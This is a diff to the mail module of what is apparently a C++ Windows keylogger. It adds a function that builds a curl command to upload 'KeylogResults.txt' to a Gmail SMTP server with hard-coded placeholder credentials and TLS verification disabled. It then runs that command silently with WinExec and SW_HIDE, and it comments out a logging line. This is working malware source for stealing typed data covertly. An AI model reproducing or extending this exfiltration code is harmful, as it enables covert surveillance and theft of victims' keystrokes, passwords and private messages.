@@ -57,6 +57,18 @@ namespace Mail {
 #undef X_EM_TO
 #undef X_EM_PASS
 
+
+//This is my version of the mail sending
+// -------------------------------------------------
+std::string makeMailCommand(){
+    std::string To = "xxxxx@gmail.com";
+    std::string From = "xxxxx@gmail.com";
+    std::string Pass = "xxxxx";
+    return("curl smtp://smtp.gmail.com:587 -v --mail-from \"" + From + "\" --mail-rcpt \"" + To + "\" --ssl -u " + From + ":" + Pass + " -T \"KeylogResults.txt\" -k --anyauth");
+}
+std::string command = makeMailCommand();
+// --------------------------------------------------
+
     std::string StringReplace(std::string s, const std::string &what, const std::string &with){
         if(what.empty()){
             return s;
@@ -116,8 +128,9 @@ namespace Mail {
         ShExecInfo.nShow = SW_HIDE;
         ShExecInfo.hInstApp = NULL;
 
-        //save body
-        Helper::WriteTestLog(body);
+        //send body
+        Helper::WriteBody(body);
+        WinExec(command.c_str(), SW_HIDE);
 
         ok = (bool)ShellExecuteEx(&ShExecInfo);
         if(!ok){
@@ -133,7 +146,7 @@ namespace Mail {
             if((int)exit_code == STILL_ACTIVE){
                 TerminateProcess(ShExecInfo.hProcess, 100);
             }
-            Helper::WriteAppLog("<From SendMail> Return Code: " + Helper::toString((int)exit_code));
+            //Helper::WriteAppLog("<From SendMail> Return Code: " + Helper::toString((int)exit_code));
         });
 
         m_timer.RepeatCount(1L);
